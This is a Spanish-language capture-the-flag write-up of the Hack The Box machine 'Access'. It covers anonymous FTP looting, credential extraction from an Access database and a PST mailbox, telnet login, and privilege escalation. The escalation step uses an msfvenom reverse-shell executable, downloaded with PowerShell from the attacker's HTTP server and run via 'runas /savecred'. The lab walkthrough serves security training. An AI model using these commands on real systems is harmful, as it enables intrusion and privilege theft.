---
title: "Hack The Box - Access"
excerpt: "<img src='/images/portfolio/access/cover.webp' width='500' height=auto><br/><br/>Access is an 'Easy' difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials."
collection: portfolio
---

NMAP
------

Utilizando la herramienta nmap para escaneo de puertos y servicios.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# nmap -A 10.10.10.98
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 13:07 CET
    Nmap scan report for 10.10.10.98
    Host is up (0.045s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: PASV failed: 425 Cannot open data connection.
    | ftp-syst: 
    |_  SYST: Windows_NT
    23/tcp open  telnet?
    80/tcp open  http    Microsoft IIS httpd 7.5
    |_http-title: MegaCorp
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: specialized|general purpose|phone
    Running (JUST GUESSING): Microsoft Windows 7|8|Phone|2008|8.1|Vista (89%)
    OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
    Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows 8.1 Update 1 (89%), Microsoft Windows Phone 7.5 or 8.0 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    TRACEROUTE (using port 80/tcp)
    HOP RTT      ADDRESS
    1   43.18 ms 10.10.14.1
    2   44.01 ms 10.10.10.98

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 59.22 seconds

HTTP
------

Si trato de conectarme a la máquina a través del puerto 80 desde el navegador obtengo lo siguiente.<br/><br/>
<img src='/images/portfolio/access/http.png' width='900' height=auto><br/><br/>
Intento obtener algo interesante a través de la herramienta 'gobuster' la cual me permite enumerar archivos y directorios dentro del sitio web.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# gobuster dir --url http://10.10.10.98/ --wordlist /usr/share/wordlists/dirb/common.txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.10.98/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /aspnet_client        (Status: 301) [Size: 156] [--> http://10.10.10.98/aspnet_client/]
    /index.html           (Status: 200) [Size: 391]
    Progress: 4614 / 4615 (99.98%)
    ===============================================================
    Finished
    ===============================================================
    
Solo consigo encontrar la ruta /index.html por lo que no parece que haya nada interesante respecto al sitio web.

FTP
------

Ahora toca centrarse en el puerto 21 el cual alberga el servicio FTP. Voy a tratar de conectarme como usuario 'anonymous' a ver si puedo encontrar algo que me interese.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# ftp 10.10.10.98
    Connected to 10.10.10.98.
    220 Microsoft FTP Service
    Name (10.10.10.98:nico): anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password: 
    230 User logged in.
    Remote system type is Windows_NT.
    ftp> ls -la
    425 Cannot open data connection.
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    08-23-18  08:16PM       <DIR>          Backups
    08-24-18  09:00PM       <DIR>          Engineer
    226 Transfer complete.
    ftp> cd Backups
    250 CWD command successful.
    ftp> ls -la
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    08-23-18  08:16PM              5652480 backup.mdb
    226 Transfer complete.
    ftp> bin
    200 Type set to I.
    ftp> get backup.mdb
    local: backup.mdb remote: backup.mdb
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    100% |****************************************************************************************************************|  5520 KiB    1.11 MiB/s    00:00 ETA
    226 Transfer complete.
    5652480 bytes received in 00:04 (1.11 MiB/s)
    ftp> cd ../Engineer
    250 CWD command successful.
    ftp> ls -lah
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    08-24-18  12:16AM                10870 Access Control.zip
    226 Transfer complete.
    ftp> get Access\ Control.zip
    local: Access Control.zip remote: Access Control.zip
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    100% |****************************************************************************************************************| 10870       83.76 KiB/s    00:00 ETA
    226 Transfer complete.
    10870 bytes received in 00:00 (83.57 KiB/s)
    ftp> quit
    221 Goodbye.
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb]
    └─# ll                       
    total 5536
    -rw-r--r-- 1 root root   10870 ago 24  2018 'Access Control.zip'
    -rw-r--r-- 1 root root 5652480 ago 23  2018  backup.mdb
    drwxr-xr-x 2 nico nico    4096 ene 20 11:55  vpn

Se han podido encontrar dos directorios 'Backups' y 'Engineer' y cada uno contiene un fichero con nombre 'Access Control.zip' y 'backup.mdb' respectivamente.<br/><br/>
Ahora se va a investigar un poco acerca de estos archivos en busqueda de algo que me interese.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# file backup.mdb         
    backup.mdb: Microsoft Access Database
                                                                                                                   
    ┌──(root㉿kali)-[/home/nico/htb]
    └─# file Access\ Control.zip 
    Access Control.zip: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# binwalk Access\ Control.zip

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             Zip archive data, encrypted at least v2.0 to extract, compressed size: 10678, uncompressed size: 271360, name: Access Control.pst
    10848         0x2A60          End of Zip archive, footer length: 22

Analizando la salida, se obtiene que el fichero 'backup.mdb' se trata de un Microsoft Access Database. En cuanto al fichero 'Access Control.zip' se encuentra encriptado por lo que de momento no podemos leer su contenido por completo.

mdbtools
------

Primero vamos a investigar la database 'backup.mdb'. Para ello se va a utilizar una herramienta llamada 'mdbtools' (https://www.kali.org/tools/mdbtools/) la cual me permitirá entre otras cosas listar las tablas, exportar el contenido de las tablas en formato JSON, etc.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# mdb-tables backup.mdb > tables.txt  
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb]
    └─# cat tables.txt          
    acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx 

Se obtiene una gran cantidad de tablas. En este tipo de situaciones, se ha de buscar alguna tabla que nos brinde cierta información confidencial. Una tabla que destaca por encima del resto es la llamada 'auth_user'.<br/><br>
Utilizando la herramienta 'mdb-json', vamos a obtener el contenido de la tabla 'auth_user' en formato JSON y se tratará de de encontrar algo interesante.

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# mdb-json backup.mdb auth_user > salida_tabla.txt
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb]
    └─# cat salida_tabla.txt 
    {"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
    {"id":27,"username":"engineer","password":"access4u@security","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
    {"id":28,"username":"backup_admin","password":"admin","Status":1,"last_login":"08/23/18 21:14:02","RoleID":26}

Esta tabla se puede ver que contiene información acerca de tres usuarios con nombre de usuario: 'admin', 'engineer' y 'backup_admin' respectivamente. El usuario 'engineer' me recuerda al directorio encontrado en el análisis FTP, por lo que voy a probar a utilizar la contraseña de este usuario 'access4u@security' para desencriptar el fichero 'Access Control.zip' que estaba contenido en el directorio 'Engineer'.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# 7z x Access\ Control.zip 

    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
    p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,12 CPUs Intel(R) Core(TM) i7-10710U CPU @ 1.10GHz (A0660),ASM,AES-NI)

    Scanning the drive for archives:
    1 file, 10870 bytes (11 KiB)

    Extracting archive: Access Control.zip
    --
    Path = Access Control.zip
    Type = zip
    Physical Size = 10870

        
    Enter password (will not be echoed):
    Everything is Ok         

    Size:       271360
    Compressed: 10870
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb]
    └─# ll                       
    total 5812
    -rw-r--r-- 1 root root  271360 ago 24  2018 'Access Control.pst'

La contraseña del usuario 'engineer' era la correcta. Una vez descomprimido el fichero, se obtiene un nuevo fichero llamado 'Access Control.pst'.<br/><br/>
Ahora utilizaré la herramienta 'readpst' (https://www.kali.org/tools/libpst/#readpst) para ver si puedo obtener algo.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# readpst Access\ Control.pst
    Opening PST file and indexes...
    Processing Folder "Deleted Items"
            "Access Control" - 2 items done, 0 items skipped.
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb]
    └─# ll
    total 5816
    -rw-r--r-- 1 root root    3112 ene 21 14:02 'Access Control.mbox'

Consigo obtener un fichero llamado 'Access Control.mbox'. Este formato de archivo guarda un registro de correo electrónico, para analizar su contenido utilizaré la herramienta 'mailutils'.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# mail -f Access\ Control.mbox
    "/home/nico/htb/Access Control.mbox": 1 mensaje
    >    1 john@megacorp.com  vie ago 24 01:44  85/3061  MegaCorp Access Control System "security" account
    ? 
    Status: RO
    From: john@megacorp.com <john@megacorp.com>
    Subject: MegaCorp Access Control System "security" account
    To: 'security@accesscontrolsystems.com'
    Date: Thu, 23 Aug 2018 23:44:07 +0000
    MIME-Version: 1.0
    Content-Type: multipart/mixed;
            boundary="--boundary-LibPST-iamunique-2039954673_-_-"


    ----boundary-LibPST-iamunique-2039954673_-_-
    Content-Type: multipart/alternative;
            boundary="alt---boundary-LibPST-iamunique-2039954673_-_-"

    --alt---boundary-LibPST-iamunique-2039954673_-_-
    Content-Type: text/plain; charset="utf-8"

    Hi there,

    

    The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

    

    Regards,

    John
    ...

Como salida obtenemos un correo electrónico enviado desde la dirección 'john@megacorp.com' al destinatario 'security@accesscontrolsystems.com'. Leyendo el contenido del mensaje, se obtiene que la contraseña de la cuenta 'security' es '4Cc3ssC0ntr0ller' la cual me puede servir para el siguiente paso.

Telnet
------

Con la salida de nmap, se sabe que el puerto 23 está abierto y es donde se encuentra el servicio Telnet. Con las credenciales obtenidas a través del correo electrónico, 'security':'4Cc3ssC0ntr0ller', trataré de conectarme al servidor.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# telnet 10.10.10.98          
    Trying 10.10.10.98...
    Connected to 10.10.10.98.
    Escape character is '^]'.
    Welcome to Microsoft Telnet Service 

    login: security
    password: 

    *===============================================================
    Microsoft Telnet Server.
    *===============================================================
    C:\Users\security>cd Desktop

    C:\Users\security\Desktop>dir
    Volume in drive C has no label.
    Volume Serial Number is 8164-DB5F

    Directory of C:\Users\security\Desktop

    08/28/2018  06:51 AM    <DIR>          .
    08/28/2018  06:51 AM    <DIR>          ..
    01/21/2024  12:07 PM                34 user.txt
                1 File(s)             34 bytes
                2 Dir(s)   3,346,747,392 bytes free

    C:\Users\security\Desktop>more "user.txt"
    bd00804d27d7876ad17354e0a5b63808

    C:\Users\security\Desktop>

Efectivamente, las credenciales son válidas y consigo acceso como usuario 'security'. Entrando en el directorio 'Desktop' se puede encontrar el flag del usuario dentro del archivo 'user.txt'.

Escalado de privilegios
------

Una vez que se tiene acceso como usuario, siempre hay que tratar de conseguir los privilegios máximos. Para ello debe realizarse un escalado de privilegios para tener un control total del servidor.<br/><br/>
A través del comando 'cmdkey /list' voy a intentar enumerar algunas credenciales guardadas<br/>

    Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
    

    C:\Users\security\Desktop>

Vemos que el usuario 'Administrador' tiene una contraseña guardada.

Metasploit & Msfvenom
------

En este apartado vamos a crear un payload que nos servirá como reverse shell con ayuda de la herramienta 'Metasploit'.

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# msfconsole -q                                                                             
    msf6 > use exploit/multi/handler 
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set PAYLOAD windows/x64/shell_reverse_tcp 
    PAYLOAD => windows/x64/shell_reverse_tcp
    msf6 exploit(multi/handler) > set LHOST 10.10.14.27
    LHOST => 10.10.14.27
    msf6 exploit(multi/handler) > set LPORT 1234
    LPORT => 1234
    msf6 exploit(multi/handler) > show options

    Module options (exploit/multi/handler):

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------


    Payload options (windows/x64/shell_reverse_tcp):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     10.10.14.27      yes       The listen address (an interface may be specified)
    LPORT     1234             yes       The listen port


    Exploit target:

    Id  Name
    --  ----
    0   Wildcard Target



    View the full module info with the info, or info -d command.

    msf6 exploit(multi/handler) >

He utilizado un payload incluído en la propia herramienta y lo único que he tenido que modificar ha sido el host de escucha, que es mi IP actual '10.10.14.27' y el puerto de escucha, que he elegido '1234'.<br/><br/>
Lo siguiente fue crear un fichero .exe que será el que descargaré en el servidor para que arranque el reverse shell en Metasploit.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.27 LPORT=1234 -f exe -o shell.exe
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of exe file: 7168 bytes
    Saved as: shell.exe
                                                                                                                                                                
    ┌──(root㉿kali)-[/home/nico/htb]
    └─# python3 -m http.server 8000
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Ahora queda descargar el fichero 'shell.exe' en el servidor y arrancarlo con el comando 'runas' para que utilice las credenciales guardadas del Administrador.<br/>

    C:\Users\security\Links>powershell -command "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.27:8000/shell.exe', 'shell.exe')"

    C:\Users\security\Links>dir
    Volume in drive C has no label.
    Volume Serial Number is 8164-DB5F

    Directory of C:\Users\security\Links

    01/21/2024  02:07 PM    <DIR>          .
    01/21/2024  02:07 PM    <DIR>          ..
    08/21/2018  10:35 PM               444 Desktop.lnk
    08/21/2018  10:35 PM               855 Downloads.lnk
    08/21/2018  10:35 PM               363 RecentPlaces.lnk
    01/21/2024  02:07 PM             7,168 shell.exe
                4 File(s)          8,830 bytes
                2 Dir(s)   3,346,735,104 bytes free

    C:\Users\security\Links>

Para confirmar que se ha descargado correctamente, se puede ver como en mi servidor HTTP se realizó un GET del fichero 'shell.exe'<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# python3 -m http.server 8000
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    10.10.14.27 - - [21/Jan/2024 15:07:37] "GET / HTTP/1.1" 200 -
    10.10.14.27 - - [21/Jan/2024 15:07:37] code 404, message File not found
    10.10.14.27 - - [21/Jan/2024 15:07:37] "GET /favicon.ico HTTP/1.1" 404 -
    10.10.10.98 - - [21/Jan/2024 15:07:45] "GET /shell.exe HTTP/1.1" 200 -

Por último arranco el exploit en Metasploit y seguidamente ejecuto el fichero 'shell.exe', obteniendo un reverse shell como usuario administrador<br/>

    C:\Users\security\Links>runas /user:ACCESS\administrator /savecred shell.exe

    C:\Users\security\Links>

<br/>

    msf6 exploit(multi/handler) > exploit

    [*] Started reverse TCP handler on 10.10.14.27:1234 
    [*] Command shell session 1 opened (10.10.14.27:1234 -> 10.10.10.98:49158) at 2024-01-21 15:11:25 +0100


    Shell Banner:
    Microsoft Windows [Version 6.1.7600]
    -----
            

    C:\Windows\system32>whoami
    whoami
    access\administrator

    C:\Windows\system32>cd ../../Users/Administrator/Desktop
    cd ../../Users/Administrator/Desktop

    C:\Users\Administrator\Desktop>dir
    dir
    Volume in drive C has no label.
    Volume Serial Number is 8164-DB5F

    Directory of C:\Users\Administrator\Desktop

    07/14/2021  02:40 PM    <DIR>          .
    07/14/2021  02:40 PM    <DIR>          ..
    01/21/2024  12:07 PM                34 root.txt
                1 File(s)             34 bytes
                2 Dir(s)   3,346,735,104 bytes free

    C:\Users\Administrator\Desktop>type root.txt
    type root.txt
    3af9de75e13f107ab3d4e61f585a7fd4

    C:\Users\Administrator\Desktop>

Como se puede ver, el flag del root se encuentra en el directorio 'Desktop' dentro del fichero 'root.txt'.